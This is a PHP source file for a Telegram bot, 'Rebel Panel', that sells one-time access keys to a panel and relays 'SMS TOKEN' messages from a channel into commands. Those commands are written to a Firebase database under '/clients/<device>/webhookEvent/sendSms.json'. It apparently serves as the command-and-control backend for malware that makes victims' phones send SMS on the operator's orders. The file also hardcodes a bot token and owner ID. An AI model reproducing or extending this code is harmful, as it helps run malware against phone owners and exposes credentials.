<?php
define('REBEL_BOT_TOKEN', '8952674967:AAGivOmzdznNBdRK2j_trdnnwv5lCDX8caA');
define('REBEL_OWNER_ID', '8432393497');
define('REBEL_BOT_USERNAME', 'Rebelpanelbot');
define('REBEL_KEYS_FILE', __DIR__ . '/data/rebel_keys.json');
define('REBEL_POLL_OFFSET_FILE', __DIR__ . '/data/rebel_bot_offset.txt');
define('REBEL_SMS_TOKEN_CONFIG_FILE', __DIR__ . '/data/sms_token_config.json');

function rebel_json_out($data, $code = 200) {
  http_response_code($code);
  header('Content-Type: application/json; charset=UTF-8');
  header('Cache-Control: no-store');
  echo json_encode($data);
  exit;
}

function rebel_keys_load() {
  if (!is_file(REBEL_KEYS_FILE)) {
    $dir = dirname(REBEL_KEYS_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    file_put_contents(REBEL_KEYS_FILE, json_encode(['keys' => [], 'sessions' => []], JSON_PRETTY_PRINT));
  }
  $raw = @file_get_contents(REBEL_KEYS_FILE);
  $data = json_decode($raw ?: '{}', true);
  if (!is_array($data)) $data = [];
  if (!isset($data['keys']) || !is_array($data['keys'])) $data['keys'] = [];
  if (!isset($data['sessions']) || !is_array($data['sessions'])) $data['sessions'] = [];
  return $data;
}

function rebel_keys_save($data) {
  $dir = dirname(REBEL_KEYS_FILE);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  $fp = fopen(REBEL_KEYS_FILE, 'c+');
  if (!$fp) return false;
  flock($fp, LOCK_EX);
  ftruncate($fp, 0);
  fwrite($fp, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
  fflush($fp);
  flock($fp, LOCK_UN);
  fclose($fp);
  return true;
}

function rebel_make_key() {
  $a = strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
  $b = strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
  return 'RBL-' . $a . '-' . $b;
}

function rebel_norm_key($key) {
  $key = strtoupper(trim((string)$key));
  return preg_replace('/\s+/', '', $key);
}

function rebel_key_login_allowed(&$data, $key) {
  $key = rebel_norm_key($key);
  if ($key === '' || !isset($data['keys'][$key])) return false;
  $row = $data['keys'][$key];
  if (!empty($row['revoked'])) return false;
  if (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1) return false;
  if (empty($row['active'])) return false;
  if (!empty($row['expires']) && time() > (int)$row['expires']) {
    $data['keys'][$key]['active'] = false;
    return false;
  }
  return $key;
}

function rebel_consume_key(&$data, $key) {
  if (!isset($data['keys'][$key])) return;
  $data['keys'][$key]['used'] = true;
  $data['keys'][$key]['uses'] = 1;
  $data['keys'][$key]['active'] = false;
  $data['keys'][$key]['used_at'] = time();
}

function rebel_purge_sessions_for_key(&$data, $key) {
  foreach ($data['sessions'] as $hash => $sess) {
    if (($sess['key_ref'] ?? '') === $key) unset($data['sessions'][$hash]);
  }
}

function rebel_revoke_key(&$data, $key) {
  $key = rebel_norm_key($key);
  if (!isset($data['keys'][$key])) return false;
  $data['keys'][$key]['active'] = false;
  $data['keys'][$key]['revoked'] = true;
  $data['keys'][$key]['revoked_at'] = time();
  rebel_purge_sessions_for_key($data, $key);
  return true;
}

function rebel_revoke_all_keys(&$data) {
  $revoked = 0;
  $now = time();
  foreach (array_keys($data['keys'] ?? []) as $k) {
    $data['keys'][$k]['active'] = false;
    $data['keys'][$k]['revoked'] = true;
    $data['keys'][$k]['revoked_at'] = $now;
    $revoked++;
  }
  $sessions = count($data['sessions'] ?? []);
  $data['sessions'] = [];
  return ['keys_revoked' => $revoked, 'sessions_cleared' => $sessions];
}

function rebel_session_valid(&$data, $token) {
  $token = trim((string)$token);
  if ($token === '') return false;
  $hash = hash('sha256', $token);
  $sess = $data['sessions'][$hash] ?? null;
  if (!$sess || time() > (int)($sess['expires'] ?? 0)) {
    if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
    return false;
  }
  $keyRef = $sess['key_ref'] ?? '';
  if ($keyRef === '' || !isset($data['keys'][$keyRef])) {
    unset($data['sessions'][$hash]);
    return false;
  }
  if (!empty($data['keys'][$keyRef]['revoked'])) {
    unset($data['sessions'][$hash]);
    return false;
  }
  return [
    'expires' => (int)$sess['expires'],
    'created' => (int)($sess['created'] ?? 0),
    'key_ref' => $keyRef
  ];
}

function rebel_create_session(&$data, $key, $remember) {
  $token = bin2hex(random_bytes(24));
  $hash = hash('sha256', $token);
  $ttl = $remember ? (30 * 86400) : (24 * 3600);
  $data['sessions'][$hash] = [
    'created' => time(),
    'expires' => time() + $ttl,
    'key_ref' => $key
  ];
  return ['token' => $token, 'expires' => time() + $ttl];
}

function rebel_tg_api($method, $params = []) {
  $url = 'https://api.telegram.org/bot' . REBEL_BOT_TOKEN . '/' . $method;
  $payload = json_encode($params ?: new stdClass());
  if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $payload,
      CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
      CURLOPT_TIMEOUT => 35,
      CURLOPT_CONNECTTIMEOUT => 15
    ]);
    $raw = curl_exec($ch);
    curl_close($ch);
    return json_decode($raw ?: '{}', true);
  }
  $ctx = stream_context_create([
    'http' => [
      'method' => 'POST',
      'header' => "Content-Type: application/json\r\n",
      'content' => $payload,
      'timeout' => 35
    ]
  ]);
  $raw = @file_get_contents($url, false, $ctx);
  return json_decode($raw ?: '{}', true);
}

function rebel_tg_send($chatId, $text) {
  return rebel_tg_api('sendMessage', [
    'chat_id' => $chatId,
    'text' => $text,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
  ]);
}

function rebel_tg_set_webhook($hookUrl) {
  return rebel_tg_api('setWebhook', ['url' => $hookUrl, 'drop_pending_updates' => true]);
}

function rebel_bot_norm_cmd($text) {
  $text = trim((string)$text);
  $text = preg_replace('/@\w+/i', '', $text);
  return trim($text);
}

function rebel_bot_webhook_url() {
  $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
  $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
  $script = $_SERVER['SCRIPT_NAME'] ?? '/panel/sex.php';
  if (basename($script) === 'rebel_bot.php') $script = dirname($script) . '/sex.php';
  return $scheme . '://' . $host . $script . '?rebel_bot_webhook=1';
}

function rebel_sms_token_config_load() {
  if (!is_file(REBEL_SMS_TOKEN_CONFIG_FILE)) {
    $dir = dirname(REBEL_SMS_TOKEN_CONFIG_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    $def = ['enabled' => false, 'device_id' => '', 'database_url' => 'https://rabel-raand-default-rtdb.firebaseio.com', 'fb_name' => 'Rebel', 'log' => []];
    file_put_contents(REBEL_SMS_TOKEN_CONFIG_FILE, json_encode($def, JSON_PRETTY_PRINT));
  }
  $raw = @file_get_contents(REBEL_SMS_TOKEN_CONFIG_FILE);
  $data = json_decode($raw ?: '{}', true);
  if (!is_array($data)) $data = [];
  if (!isset($data['log']) || !is_array($data['log'])) $data['log'] = [];
  return $data;
}

function rebel_sms_token_config_save($data) {
  $dir = dirname(REBEL_SMS_TOKEN_CONFIG_FILE);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  file_put_contents(REBEL_SMS_TOKEN_CONFIG_FILE, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

function rebel_parse_sms_token($text) {
  $text = trim((string)$text);
  if ($text === '' || !preg_match('/SMS\s*TOKEN/i', $text)) return null;
  $to = '';
  if (preg_match('/(?:📞\s*)?To:\s*([+\d\s\-()]+)/iu', $text, $m)) {
    $to = preg_replace('/\D/', '', $m[1]);
  }
  $msg = '';
  if (preg_match('/(?:💬\s*)?Message:\s*(.+)/isu', $text, $m)) {
    $msg = trim($m[1]);
    $msg = preg_replace('/[━─_]{3,}.*$/su', '', $msg);
    $msg = trim($msg);
  }
  if (strlen($to) < 10 || $msg === '') return null;
  if (strlen($to) > 10) $to = substr($to, -10);
  return ['to' => $to, 'message' => $msg];
}

function rebel_firebase_send_sms($dbUrl, $deviceId, $to, $message) {
  $dbUrl = rtrim((string)$dbUrl, '/');
  $deviceId = trim((string)$deviceId);
  if ($dbUrl === '' || $deviceId === '') return ['ok' => false, 'error' => 'Firebase URL or device not set'];
  $path = $dbUrl . '/clients/' . rawurlencode($deviceId) . '/webhookEvent/sendSms.json';
  $payload = json_encode(['to' => $to, 'message' => $message, 'from' => 1, 'isSended' => false]);
  if (function_exists('curl_init')) {
    $ch = curl_init($path);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_CUSTOMREQUEST => 'PUT',
      CURLOPT_POSTFIELDS => $payload,
      CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
      CURLOPT_TIMEOUT => 20
    ]);
    $raw = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code >= 200 && $code < 300) return ['ok' => true];
    return ['ok' => false, 'error' => 'Firebase HTTP ' . $code, 'detail' => $raw];
  }
  $ctx = stream_context_create([
    'http' => ['method' => 'PUT', 'header' => "Content-Type: application/json\r\n", 'content' => $payload, 'timeout' => 20, 'ignore_errors' => true]
  ]);
  $raw = @file_get_contents($path, false, $ctx);
  return ['ok' => $raw !== false, 'detail' => $raw];
}

function rebel_sms_token_log($entry) {
  $cfg = rebel_sms_token_config_load();
  array_unshift($cfg['log'], $entry);
  $cfg['log'] = array_slice($cfg['log'], 0, 40);
  rebel_sms_token_config_save($cfg);
}

function rebel_sms_token_try_send($text, $meta) {
  $parsed = rebel_parse_sms_token($text);
  if (!$parsed) return false;
  $cfg = rebel_sms_token_config_load();
  if (empty($cfg['enabled'])) {
    rebel_sms_token_log(['ts' => time(), 'ok' => false, 'to' => $parsed['to'], 'message' => $parsed['message'], 'error' => 'Auto token SMS disabled', 'source' => $meta['source'] ?? '']);
    return true;
  }
  $dedup = md5($parsed['to'] . '|' . $parsed['message']);
  foreach ($cfg['log'] as $row) {
    if (!empty($row['dedup']) && $row['dedup'] === $dedup && (time() - (int)($row['ts'] ?? 0)) < 120) return true;
  }
  if (empty($cfg['device_id']) || empty($cfg['database_url'])) {
    rebel_sms_token_log(['ts' => time(), 'ok' => false, 'to' => $parsed['to'], 'message' => $parsed['message'], 'error' => 'Device or Firebase not configured', 'source' => $meta['source'] ?? '']);
    rebel_tg_send(REBEL_OWNER_ID, "❌ SMS TOKEN parsed but device not set.\nTo: <code>" . $parsed['to'] . "</code>\nPanel → Auto Token → Enable + select device");
    return true;
  }
  $res = rebel_firebase_send_sms($cfg['database_url'], $cfg['device_id'], $parsed['to'], $parsed['message']);
  rebel_sms_token_log([
    'ts' => time(), 'ok' => !empty($res['ok']), 'to' => $parsed['to'], 'message' => $parsed['message'],
    'device' => $cfg['device_id'], 'source' => $meta['source'] ?? '', 'dedup' => $dedup,
    'error' => $res['error'] ?? ''
  ]);
  if (!empty($res['ok'])) {
    rebel_tg_send(REBEL_OWNER_ID, "✅ <b>Auto SMS Sent</b>\n\n📞 To: <code>" . $parsed['to'] . "</code>\n💬 " . htmlspecialchars(mb_substr($parsed['message'], 0, 200), ENT_QUOTES, 'UTF-8'));
  } else {
    rebel_tg_send(REBEL_OWNER_ID, "❌ Auto SMS failed\nTo: <code>" . $parsed['to'] . "</code>\n" . htmlspecialchars($res['error'] ?? 'Unknown', ENT_QUOTES, 'UTF-8'));
  }
  return true;
}

function rebel_bot_handle_update($update) {
  if (!empty($update['channel_post']) || !empty($update['edited_channel_post'])) {
    $post = $update['channel_post'] ?? $update['edited_channel_post'];
    $text = trim((string)($post['text'] ?? $post['caption'] ?? ''));
    if ($text !== '') rebel_sms_token_try_send($text, ['source' => 'channel', 'chat_id' => $post['chat']['id'] ?? '']);
    return true;
  }
  $msg = $update['message'] ?? null;
  if (!$msg) return false;
  $text = trim((string)($msg['text'] ?? $msg['caption'] ?? ''));
  if ($text !== '' && rebel_parse_sms_token($text)) {
    rebel_sms_token_try_send($text, ['source' => 'message', 'chat_id' => $msg['chat']['id'] ?? '']);
  }
  if (preg_match('/^\//', $text)) return rebel_bot_handle($update);
  return $text !== '';
}

function rebel_bot_handle($update) {
  $msg = $update['message'] ?? null;
  if (!$msg) return false;
  $chatId = (string)($msg['chat']['id'] ?? '');
  $fromId = (string)($msg['from']['id'] ?? '');
  $text = rebel_bot_norm_cmd($msg['text'] ?? '');
  if ($text === '') return false;

  if ($fromId !== REBEL_OWNER_ID) {
    rebel_tg_send($chatId, "⛔ Unauthorized.\nOnly owner can use this bot.");
    return true;
  }

  if (preg_match('/^\/start\b/i', $text)) {
    rebel_tg_send($chatId, "🤖 <b>Rebel Panel Key Bot</b> (@Rebelpanelbot)\n\n/genkey [days] — New one-time access key\n/keys — List keys\n/revoke RBL-XXX — Revoke one key\n/revokeall — Revoke ALL keys\n/smstoken on|off — Auto SMS from channel\n/setdevice ID — Device for auto SMS\n/status — Bot status\n/poll — Polling mode\n/webhook — Webhook mode");
    return true;
  }

  if (preg_match('/^\/status\b/i', $text)) {
    $me = rebel_tg_api('getMe', []);
    $wh = rebel_tg_api('getWebhookInfo', []);
    $mode = !empty($wh['result']['url']) ? 'Webhook' : 'Polling (or offline)';
    $url = $wh['result']['url'] ?? '—';
    rebel_tg_send($chatId, "📡 <b>Bot Status</b>\n\nBot: @" . ($me['result']['username'] ?? 'Rebelpanelbot') . "\nMode: " . $mode . "\nWebhook: <code>" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "</code>\nPending: " . (int)($wh['result']['pending_update_count'] ?? 0));
    return true;
  }

  if (preg_match('/^\/poll\b/i', $text)) {
    rebel_tg_api('deleteWebhook', ['drop_pending_updates' => false]);
    rebel_tg_send($chatId, "✅ Polling mode ON.\n\nRun on your server:\n<code>php rebel_bot.php</code>\n\nOr cron:\n<code>curl \"YOUR_DOMAIN/rebel_bot.php?poll=1&owner=8432393497\"</code>");
    return true;
  }

  if (preg_match('/^\/webhook\b/i', $text) || preg_match('/^\/setwebhook\b/i', $text)) {
    $hook = rebel_bot_webhook_url();
    if (strpos($hook, 'https://') !== 0) {
      rebel_tg_send($chatId, "❌ HTTPS domain required for webhook.\nCurrent: <code>" . htmlspecialchars($hook, ENT_QUOTES, 'UTF-8') . "</code>\n\nUse polling instead: /poll");
      return true;
    }
    $res = rebel_tg_set_webhook($hook);
    rebel_tg_send($chatId, !empty($res['ok']) ? "✅ Webhook set:\n<code>" . htmlspecialchars($hook, ENT_QUOTES, 'UTF-8') . "</code>" : ("❌ Webhook failed: " . htmlspecialchars($res['description'] ?? 'error', ENT_QUOTES, 'UTF-8')));
    return true;
  }

  if (preg_match('/^\/genkey(?:\s+(\d+))?\s*$/i', $text, $m)) {
    $days = isset($m[1]) ? max(0, (int)$m[1]) : 30;
    $data = rebel_keys_load();
    $key = rebel_make_key();
    while (isset($data['keys'][$key])) $key = rebel_make_key();
    $data['keys'][$key] = [
      'created' => time(),
      'expires' => $days > 0 ? time() + ($days * 86400) : 0,
      'active' => true,
      'used' => false,
      'revoked' => false,
      'uses' => 0,
      'label' => 'tg-' . date('dM-Hi')
    ];
    rebel_keys_save($data);
    $exp = $days > 0 ? ("\n⏳ Expires: " . date('d M Y, h:i A', $data['keys'][$key]['expires'])) : "\n♾️ No expiry";
    rebel_tg_send($chatId, "🔑 <b>New Rebel Panel Key</b> (one-time)\n\n<code>" . $key . "</code>" . $exp . "\n\n⚠️ Valid for <b>one use only</b>. Paste it in the panel login.");
    return true;
  }

  if (preg_match('/^\/keys\b/i', $text)) {
    $data = rebel_keys_load();
    $lines = [];
    foreach ($data['keys'] as $k => $row) {
      $mask = substr($k, 0, 8) . '••••';
      if (!empty($row['revoked'])) {
        $lines[] = '• <code>' . $mask . '</code> · revoked';
        continue;
      }
      if (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1) {
        $lines[] = '• <code>' . $mask . '</code> · used';
        continue;
      }
      if (!empty($row['expires']) && time() > (int)$row['expires']) continue;
      if (empty($row['active'])) continue;
      $lines[] = '• <code>' . $mask . '</code> · unused';
    }
    rebel_tg_send($chatId, $lines ? ("📋 <b>Keys</b>\n\n" . implode("\n", $lines)) : "📋 No keys.");
    return true;
  }

  if (preg_match('/^\/smstoken\s+(on|off)\b/i', $text, $m)) {
    $cfg = rebel_sms_token_config_load();
    $cfg['enabled'] = strtolower($m[1]) === 'on';
    rebel_sms_token_config_save($cfg);
    rebel_tg_send($chatId, $cfg['enabled'] ? "✅ Auto Token SMS <b>ON</b>\nAdd bot as admin to your Telegram channel.\nDevice: <code>" . ($cfg['device_id'] ?: 'not set — /setdevice ID') . "</code>" : "⏸ Auto Token SMS <b>OFF</b>");
    return true;
  }

  if (preg_match('/^\/setdevice\s+(\S+)/i', $text, $m)) {
    $cfg = rebel_sms_token_config_load();
    $cfg['device_id'] = trim($m[1]);
    rebel_sms_token_config_save($cfg);
    rebel_tg_send($chatId, "✅ Auto SMS device set:\n<code>" . htmlspecialchars($cfg['device_id'], ENT_QUOTES, 'UTF-8') . "</code>");
    return true;
  }

  if (preg_match('/^\/revokeall\b/i', $text)) {
    $data = rebel_keys_load();
    $res = rebel_revoke_all_keys($data);
    rebel_keys_save($data);
    rebel_tg_send($chatId, "🚫 <b>All keys revoked</b>\n\nKeys: " . (int)$res['keys_revoked'] . "\nSessions killed: " . (int)$res['sessions_cleared'] . "\n\nAll open panels will be locked.");
    return true;
  }

  if (preg_match('/^\/revoke\s+(RBL-[A-Z0-9\-]+)/i', $text, $m)) {
    $key = rebel_norm_key($m[1]);
    $data = rebel_keys_load();
    if (!rebel_revoke_key($data, $key)) {
      rebel_tg_send($chatId, "❌ Key not found.");
      return true;
    }
    rebel_keys_save($data);
    rebel_tg_send($chatId, "✅ Revoked + session killed:\n<code>" . $key . "</code>");
    return true;
  }

  rebel_tg_send($chatId, "Unknown command. Send /start for help.");
  return true;
}

function rebel_bot_poll_once($timeout = 2) {
  $offset = 0;
  if (is_file(REBEL_POLL_OFFSET_FILE)) {
    $offset = (int)trim((string)@file_get_contents(REBEL_POLL_OFFSET_FILE));
  }
  $res = rebel_tg_api('getUpdates', [
    'offset' => $offset,
    'timeout' => $timeout,
    'allowed_updates' => ['message', 'channel_post', 'edited_channel_post']
  ]);
  if (empty($res['ok'])) return ['ok' => false, 'error' => $res['description'] ?? 'getUpdates failed', 'handled' => 0];
  $handled = 0;
  foreach ($res['result'] ?? [] as $u) {
    $offset = (int)$u['update_id'] + 1;
    if (rebel_bot_handle_update($u)) $handled++;
  }
  if ($offset > 0) {
    $dir = dirname(REBEL_POLL_OFFSET_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    file_put_contents(REBEL_POLL_OFFSET_FILE, (string)$offset);
  }
  return ['ok' => true, 'handled' => $handled, 'offset' => $offset];
}

function rebel_bot_run_forever() {
  echo "Rebel Panel Bot — @" . REBEL_BOT_USERNAME . "\n";
  $me = rebel_tg_api('getMe', []);
  if (empty($me['ok'])) {
    echo "ERROR: Bot token invalid\n";
    exit(1);
  }
  rebel_tg_api('deleteWebhook', ['drop_pending_updates' => false]);
  echo "Polling mode started. Press Ctrl+C to stop.\n";
  while (true) {
    $res = rebel_bot_poll_once(25);
    if (!empty($res['handled'])) echo date('H:i:s') . " — handled {$res['handled']} update(s)\n";
    if (empty($res['ok'])) {
      echo date('H:i:s') . " — API error, retry...\n";
      sleep(3);
    }
  }
}
